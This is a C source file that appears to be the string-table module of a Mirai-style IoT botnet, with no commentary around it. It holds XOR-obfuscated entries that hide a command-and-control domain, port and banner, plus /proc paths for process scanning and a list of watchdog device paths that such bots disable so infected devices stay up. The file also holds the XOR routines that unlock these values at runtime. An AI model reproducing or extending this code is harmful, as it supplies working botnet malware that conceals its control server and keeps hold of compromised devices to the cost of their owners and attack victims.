#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "xor.h"
#include "util.h"

uint32_t table_key = 0xabffff;

struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	add_entry(XOR_DOMAIN, "\xCA\xCF\xC6\xC2\xC5\x85\xCF\xDE\xC8\x98\xC0\x85\xC8\xC4\xC6\xAB", 16);
    add_entry(XOR_PORT, "\xAE\x92", 2);
    add_entry(XOR_EXEC, "\xD8\xD2\xD8\xDF\xCE\xC6\x8B\xDE\xDB\xCF\xCA\xDF\xCE\x8B\xCF\xC4\xC5\xCE\xAB", 19);
    
    add_entry(XOR_PROC, "\x84\xDB\xD9\xC4\xC8\x84\xAB", 7); // /proc/
    add_entry(XOR_EXE, "\x84\xCE\xD3\xCE\xAB", 5); // /exe
    add_entry(XOR_FD, "\x84\xCD\xCF\xAB", 4); // /fd
    add_entry(XOR_CMDLINE, "\x84\xC8\xC6\xCF\xC7\xC2\xC5\xCE\xAB", 9); // /cmdline

    add_entry(XOR_WATCHDOG1, "\x84\xCF\xCE\xDD\x84\xDC\xCA\xDF\xC8\xC3\xCF\xC4\xCC\xAB", 14); // /dev/watchdog
    add_entry(XOR_WATCHDOG2, "\x84\xCF\xCE\xDD\x84\xC6\xC2\xD8\xC8\x84\xDC\xCA\xDF\xC8\xC3\xCF\xC4\xCC\xAB", 19); // /dev/misc/watchdog
    add_entry(XOR_WATCHDOG3, "\x84\xD8\xC9\xC2\xC5\x84\xDC\xCA\xDF\xC8\xC3\xCF\xC4\xCC\xAB", 15); // /sbin/watchdog
    add_entry(XOR_WATCHDOG4, "\x84\xC9\xC2\xC5\x84\xDC\xCA\xDF\xC8\xC3\xCF\xC4\xCC\xAB", 14); // /bin/watchdog
    add_entry(XOR_WATCHDOG5, "\x84\xCF\xCE\xDD\x84\xED\xFF\xFC\xEF\xFF\x9A\x9B\x9A\xF4\xDC\xCA\xDF\xC8\xC3\xCF\xC4\xCC\xAB", 23); // /dev/DTWDT101_watchdog
    add_entry(XOR_WATCHDOG6, "\x84\xCF\xCE\xDD\x84\xED\xFF\xFC\xEF\xFF\x9A\x9B\x9A\x84\xDC\xCA\xDF\xC8\xC3\xCF\xC4\xCC\xAB", 23); // /dev/FTWDT101/watchdog
    add_entry(XOR_WATCHDOG7, "\x84\xCF\xCE\xDD\x84\xDC\xCA\xDF\xC8\xC3\xCF\xC4\xCC\x9B\xAB", 15); // /dev/watchdog0
    add_entry(XOR_WATCHDOG8, "\x84\xCE\xDF\xC8\x84\xCF\xCE\xCD\xCA\xDE\xC7\xDF\x84\xDC\xCA\xDF\xC8\xC3\xCF\xC4\xCC\xAB", 22); // /etc/default/watchdog

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
